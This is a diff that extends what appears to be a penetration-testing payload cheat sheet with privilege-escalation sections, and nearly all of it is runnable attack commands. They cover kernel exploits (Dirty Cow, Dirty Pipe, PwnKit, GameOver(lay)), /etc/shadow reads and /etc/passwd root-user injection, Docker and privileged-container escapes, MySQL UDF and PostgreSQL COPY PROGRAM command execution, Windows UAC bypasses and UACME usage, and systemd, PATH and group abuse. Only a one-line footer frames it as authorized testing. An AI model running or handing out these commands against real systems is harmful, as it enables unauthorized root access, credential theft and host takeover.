@@ -822,6 +822,466 @@ cat /var/run/secrets/kubernetes.io/serviceaccount/token
 
 ---
 
+---
+
+## 15. Linux Kernel Exploit Deep Dive
+
+### 15.1 Dirty Cow (CVE-2016-5195) -- Advanced Variants
+
+```bash
+# Dirty Cow via PTRACE_POKEDATA (most reliable variant)
+# Affects Linux kernel 2.6.22 through 4.8.3
+gcc -pthread dirtyc0w.c -o dirtyc0w
+./dirtyc0w /etc/passwd "hacker:$1$hacker$Xxxxx...:0:0:root:/root:/bin/bash"
+
+# Dirty Cow via mmap write -- alternative exploit
+gcc -o dirty_cow_mmap dirty_cow_mmap.c -lpthread
+./dirty_cow_mmap /etc/passwd
+
+# Dirty Cow via /proc/self/mem -- direct memory write
+gcc -o cow_procmem cow_procmem.c
+./cow_procmem /etc/passwd "root::0:0:root:/root:/bin/bash"
+
+# Check if kernel is vulnerable to Dirty Cow
+uname -r | awk -F. '{if ($1==4 && $2<=8) print "Vulnerable"; else if ($1<4 && $1>=2) print "Check version"; else print "Likely patched"}'
+```
+
+### 15.2 Dirty Pipe (CVE-2022-0847) -- Kernel 5.8 to 5.16.11
+
+```bash
+# Dirty Pipe -- overwrite any readable file as unprivileged user
+# No race condition required (100% reliable, unlike Dirty Cow)
+gcc -o dirtypipe dirtypipe.c
+./dirtypipe /etc/passwd 1
+
+# Overwrite SUID binary for instant root shell
+# Find a readable SUID binary:
+find / -perm -4000 -readable -type f 2>/dev/null | head -5
+./dirtypipe /usr/bin/sudo 1
+
+# Dirty Pipe via Python PoC
+python3 dirtypipe.py --target /etc/passwd --offset 1 --data "root::0:0::/root:/bin/bash\n"
+
+# Patch check -- kernel versions 5.8.0 to 5.16.10 are vulnerable
+uname -r
+# Fixed in: 5.16.11, 5.15.25, 5.10.102
+```
+
+### 15.3 PwnKit (CVE-2021-4034) -- polkit pkexec
+
+```bash
+# PwnKit -- affects all major distros with polkit installed
+# No special privileges or user interaction required
+gcc pwnkit.c -o pwnkit
+./pwnkit
+# Immediate root shell
+
+# PwnKit with custom command execution
+./pwnkit "id && cat /etc/shadow"
+
+# Verify polkit is installed before attempting
+which pkexec 2>/dev/null
+dpkg -l policykit-1 2>/dev/null
+rpm -qa polkit 2>/dev/null
+
+# Check pkexec version for vulnerability
+pkexec --version
+```
+
+### 15.4 GameOver(lay) -- CVE-2023-2640 / CVE-2023-32629
+
+```bash
+# Ubuntu OverlayFS privilege escalation
+# Affects Ubuntu kernels using OverlayFS (multiple Ubuntu releases)
+gcc -o gameoverlay gameover.c
+./gameoverlay
+
+# Verify Ubuntu kernel vulnerability
+uname -r
+cat /etc/os-release | grep -i ubuntu
+# Affected: Ubuntu 22.04 (5.15.0), Ubuntu 20.04 (5.4.0), Ubuntu 23.04 (6.2.0)
+
+# GameOver via overlayfs mount exploitation
+# Create overlay mount, write to upperdir, gain root
+mkdir -p /tmp/overlay /tmp/merged /tmp/work
+mount -t overlay overlay -o lowerdir=/etc,upperdir=/tmp/overlay,workdir=/tmp/work /tmp/merged
+```
+
+---
+
+## 16. Advanced GTFOBins Techniques
+
+### 16.1 File Read via GTFOBins
+
+```bash
+# Read /etc/shadow using SUID find
+find /etc/shadow -exec cat {} \;
+
+# Read files using SUID xxd
+xxd /etc/shadow | xxd -r
+
+# Read files using SUID hexdump
+hd /etc/shadow | head -50
+
+# Read files using SUID head (if only partial needed)
+head -c 1000 /etc/shadow
+
+# Read files using SUID tail
+tail -n 100 /etc/shadow
+
+# Read files via SUID rev (reverse output)
+rev /etc/shadow | rev
+
+# Read files via SUID sort (lines sorted alphabetically)
+sort /etc/shadow
+```
+
+### 16.2 File Write via GTFOBins
+
+```bash
+# Overwrite /etc/passwd using SUID cp
+echo 'hacker:$1$hacker$hash:0:0:root:/root:/bin/bash' > /tmp/newuser
+cp /tmp/newuser /etc/passwd
+
+# Write using SUID dd
+echo 'hacker:$1$hacker$hash:0:0:root:/root:/bin/bash' | dd of=/etc/passwd conv=notrunc
+
+# Write using SUID tee
+echo 'hacker:$1$hacker$hash:0:0:root:/root:/bin/bash' | tee -a /etc/passwd
+
+# Write using SUID install
+install -m 4755 /tmp/rootbash /bin/rootbash
+```
+
+### 16.3 Shell Escapes via GTFOBins
+
+```bash
+# SUID make -- execute commands via makefile
+echo 'all:\n\t/bin/bash -p' > /tmp/makefile
+make -f /tmp/makefile
+
+# SUID awk -- spawn shell
+awk 'BEGIN {system("/bin/bash -p")}'
+
+# SUID cpan -- perl shell escape
+cpan
+! exec "/bin/bash -p"
+
+# SUID less -- execute commands
+less /etc/passwd
+# Type: !bash -p
+
+# SUID more -- execute commands
+more /etc/passwd
+# Type: !bash
+
+# SUID scp -- execute via scp -S (proxy command)
+scp -S /path/to/shell.sh x y:
+
+# SUID ssh -- proxy command escape
+ssh -o ProxyCommand='bash -p -i' x
+```
+
+---
+
+## 17. Docker and Container Escape
+
+### 17.1 Docker Socket Escape
+
+```bash
+# Check if Docker socket is accessible
+ls -la /var/run/docker.sock
+
+# Escape via Docker socket -- mount host filesystem
+docker -H unix:///var/run/docker.sock run -v /:/hostfs -it alpine chroot /hostfs
+
+# Escape via Docker API over TCP
+docker -H tcp://127.0.0.1:2375 run -v /:/hostfs -it alpine chroot /hostfs
+
+# Create privileged container with host PID namespace
+docker -H unix:///var/run/docker.sock run --pid=host -it alpine nsenter -t 1 -m -u -i -n sh
+
+# Docker escape via cgroup release_agent
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /cmd
+echo 'cat /etc/shadow > '"$host_path"'/output' >> /cmd
+chmod a+x /cmd
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+```
+
+### 17.2 Privileged Container Escape
+
+```bash
+# Check if container is privileged (full capabilities)
+cat /proc/1/status | grep CapEff
+# CapEff: 0000003fffffffff = fully privileged
+
+# Decode capabilities
+capsh --decode=0000003fffffffff
+
+# Escape via device mount
+mkdir -p /mnt/host
+mount /dev/sda1 /mnt/host
+chroot /mnt/host /bin/bash
+
+# Escape via nsenter (if PID namespace is shared)
+nsenter -t 1 -m -u -i -n -- /bin/bash
+
+# Escape via /proc/sys/kernel/core_pattern
+echo "|/var/tmp/escape.sh" > /proc/sys/kernel/core_pattern
+```
+
+---
+
+## 18. Database Privilege Escalation
+
+### 18.1 MySQL UDF Privilege Escalation
+
+```bash
+# Check MySQL version and current privileges
+mysql -u root -p -e "SELECT VERSION(); SELECT USER(); SHOW GRANTS;"
+
+# MySQL UDF (User Defined Functions) privilege escalation
+# Requires FILE privilege and plugin directory write access
+
+# Check plugin directory
+mysql -u root -p -e "SHOW VARIABLES LIKE 'plugin_dir';"
+
+# Compile MySQL UDF exploit (sys_exec / sys_eval)
+gcc -shared -fPIC -o /usr/lib/mysql/plugin/raptor_udf2.so raptor_udf2.so.c
+# Or use pre-compiled:
+# /usr/share/sqlmap/extra/sys_exec/raptor_udf2.so
+
+# Register UDF and execute commands
+mysql -u root -p << 'SQL'
+CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'raptor_udf2.so';
+CREATE FUNCTION sys_eval RETURNS STRING SONAME 'raptor_udf2.so';
+SQL
+
+# Execute system commands as MySQL user (often root)
+mysql -u root -p -e "SELECT sys_exec('id > /tmp/mysql_privesc.txt');"
+mysql -u root -p -e "SELECT sys_eval('whoami');"
+mysql -u root -p -e "SELECT sys_exec('chmod u+s /bin/bash');"
+```
+
+### 18.2 PostgreSQL Privilege Escalation
+
+```bash
+# Check PostgreSQL version and current role
+psql -U postgres -c "SELECT version(); SELECT current_user;"
+
+# PostgreSQL COPY command for file read
+psql -U postgres -c "COPY (SELECT 1) TO '/tmp/test';"
+psql -U postgres -c "COPY (SELECT pg_read_file('/etc/shadow')) TO '/tmp/shadow.txt';"
+
+# PostgreSQL large object for binary file operations
+psql -U postgres << 'SQL'
+SELECT lo_create(1234);
+SELECT lo_export(1234, '/tmp/exported_file');
+INSERT INTO pg_largeobject (loid, pageno, data) VALUES (1234, 0, decode('f0VMRg==', 'base64'));
+SELECT lo_import('/etc/shadow', 5678);
+SELECT lo_export(5678, '/tmp/shadow_copy');
+SQL
+
+# PostgreSQL command execution via COPY PROGRAM (PostgreSQL 9.3+)
+psql -U postgres -c "COPY (SELECT 'id') TO PROGRAM '/bin/bash -c \"id > /tmp/pg_output\"';"
+
+# PostgreSQL extension creation for code execution
+psql -U postgres -c "CREATE EXTENSION pgcrypto;"
+psql -U postgres -c "CREATE EXTENSION dblink;"
+
+# PostgreSQL dblink for lateral network access
+psql -U postgres -c "SELECT dblink_connect('host=127.0.0.1 port=5432 dbname=postgres user=postgres password=guess');"
+```
+
+---
+
+## 19. Windows UAC Bypass Advanced Techniques
+
+### 19.1 UAC Bypass via Token Manipulation
+
+```powershell
+# UAC bypass via COM object hijacking (ICMLuaUtil)
+# Works on Windows 10/11 with default UAC settings
+reg add "HKCU\Software\Classes\CLSID\{F2C4639E-6E61-4766-872C-5FDE252F35C6}\LocalServer32" /ve /t REG_SZ /d "C:\Temp\malicious.exe" /f
+# Trigger via scheduled task:
+schtasks /run /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup"
+
+# UAC bypass via WSReset.exe (Windows Store reset)
+reg add "HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\shell\open\command" /ve /t REG_SZ /d "C:\Temp\malicious.exe" /f
+reg add "HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f
+wsreset.exe
+
+# UAC bypass via SecurityCenterPSHModule
+# Uses the Security Center COM object to execute elevated PowerShell
+# Bypasses default UAC without registry modification
+```
+
+### 19.2 UAC Bypass via DLL Side-Loading
+
+```powershell
+# UAC bypass via consent.exe DLL hijacking
+# Requires placing a malicious version.dll in System32 directory
+# Works when UAC is configured to "Always Notify" (highest setting)
+
+# UAC bypass via Task Scheduler (auto-elevated COM object)
+# Create a scheduled task that runs as highest available privilege
+schtasks /create /tn "UACBypass" /tr "C:\Temp\malicious.exe" /sc once /st 00:00 /rl HIGHEST
+schtasks /run /tn "UACBypass"
+schtasks /delete /tn "UACBypass" /f
+
+# UAC bypass via env variable expansion (Token Broker)
+# Exploit DLL search order in token broker runtime
+set COMSPEC=C:\Temp\malicious.exe
+# Then trigger any auto-elevated COM object
+```
+
+### 19.3 Automated UAC Bypass Toolkit
+
+```powershell
+# UACME (https://github.com/hfiref0x/UACME) -- 60+ bypass methods
+# Method 23: fodhelper.exe bypass (reliable on Win10/11)
+Akagi64.exe 23 C:\Temp\malicious.exe
+
+# Method 33: CMSTP bypass (works on all Windows versions)
+Akagi64.exe 33 C:\Temp\malicious.exe
+
+# Method 34: Slui.exe bypass
+Akagi64.exe 34 C:\Temp\malicious.exe
+
+# Method 41: Token Broker bypass (Win10 1709+)
+Akagi64.exe 41 C:\Temp\malicious.exe
+
+# Method 61: WSReset.exe bypass (Windows Store)
+Akagi64.exe 61 C:\Temp\malicious.exe
+
+# Method 72: COM handlers bypass (Win10 21H2+)
+Akagi64.exe 72 C:\Temp\malicious.exe
+```
+
+---
+
+---
+
+## 20. Miscellaneous Escalation Vectors
+
+### 20.1 Writable /etc/shadow
+
+```bash
+# Check if /etc/shadow is writable
+ls -la /etc/shadow
+
+# Generate password hash for new password
+openssl passwd -6 -salt hacker password123
+
+# Replace root password hash in /etc/shadow
+sed -i 's|^root:[^:]*:|root:$6$hacker$HASH_HERE:|' /etc/shadow
+
+# Or append a known hash for root
+echo 'root:$6$hacker$HASH_HERE:19000:0:99999:7:::' > /tmp/root_entry
+cat /tmp/root_entry /etc/shadow > /tmp/new_shadow
+mv /tmp/new_shadow /etc/shadow
+```
+
+### 20.2 Capstone Linux Privilege Escalation Checklist
+
+```bash
+# Quick privilege escalation enumeration script
+echo "[*] Kernel and OS:" && uname -a && cat /etc/os-release
+echo "[*] Current user:" && id && whoami
+echo "[*] SUID binaries:" && find / -perm -4000 -type f 2>/dev/null
+echo "[*] Capabilities:" && getcap -r / 2>/dev/null
+echo "[*] sudo rules:" && sudo -l 2>/dev/null
+echo "[*] Cron jobs:" && cat /etc/crontab 2>/dev/null && ls -la /etc/cron.*
+echo "[*] Writable /etc/passwd:" && ls -la /etc/passwd
+echo "[*] Writable /etc/shadow:" && ls -la /etc/shadow
+echo "[*] Docker socket:" && ls -la /var/run/docker.sock 2>/dev/null
+echo "[*] NFS exports:" && cat /etc/exports 2>/dev/null
+echo "[*] Container check:" && cat /proc/1/cgroup 2>/dev/null | head -3
+```
+
+### 20.3 Systemd Timer Abuse
+
+```bash
+# Find writable systemd timers
+find /etc/systemd -name "*.timer" -writable 2>/dev/null
+find /etc/systemd -name "*.service" -writable 2>/dev/null
+
+# If a service run by root is writable, inject a command
+echo "ExecStartPre=/bin/bash -c 'chmod u+s /bin/bash'" >> /etc/systemd/system/vulnerable.service
+systemctl daemon-reload
+
+# Check active timers
+systemctl list-timers --all
+```
+
+### 20.4 Path Variable Hijacking (Non-Cron)
+
+```bash
+# Check PATH for writable directories
+echo $PATH | tr ':' '\n' | while read d; do [ -w "$d" ] && echo "WRITABLE: $d"; done
+
+# If a SUID binary calls another command without full path, hijack it
+# Example: SUID binary calls 'system("ps")' instead of 'system("/usr/bin/ps")'
+echo '/bin/bash -p' > /tmp/ps
+chmod +x /tmp/ps
+export PATH=/tmp:$PATH
+./suid_binary  # Will execute /tmp/ps instead of /usr/bin/ps
+```
+
+### 20.5 Linux Group-Based Escalation
+
+```bash
+# Check current user groups for escalation vectors
+id
+groups
+
+# disk group -- can read block devices directly
+debugfs /dev/sda1
+# Inside debugfs: cat /etc/shadow
+
+# lxd/lxc group -- container escape via LXD
+lxc init alpine privesc -c security.privileged=true
+lxc config device add privesc host disk source=/ path=/mnt/root
+lxc start privesc
+lxc exec privesc /bin/sh
+# Access host filesystem at /mnt/root
+
+# video group -- can read framebuffer
+cat /dev/fb0 > /tmp/screen.raw
+# Convert raw framebuffer to viewable image
+
+# adm group -- can read system logs
+cat /var/log/auth.log | grep -i "sudo\|su\|password"
+zcat /var/log/auth.log.*.gz | grep -i "password" | grep -v "COMMAND"
+```
+
+### 20.6 Kernel Module and Exploit Compilation
+
+```bash
+# Compile and run kernel exploit from source on target
+# Often needed when pre-compiled binaries are not available
+
+# Check for compiler availability
+which gcc cc make
+
+# If no compiler, check for alternatives
+which python python3 perl ruby php
+# Python can compile C code via subprocess
+python3 -c "import subprocess; subprocess.run(['gcc', '-o', 'exploit', 'exploit.c'])"
+
+# Transfer exploit source via base64 encoding (when binary transfer fails)
+# On attacker:
+base64 -w0 exploit.c | tr -d '\n' > exploit.b64
+# On target:
+echo "BASE64_CONTENT" | base64 -d > exploit.c && gcc -o exploit exploit.c && ./exploit
+```
+
+---
+
 _All payloads are for authorized penetration testing scenarios only. Unauthorized use is illegal._
 
-_Last updated: 2026-06-04_
+_Last updated: 2026-06-10_
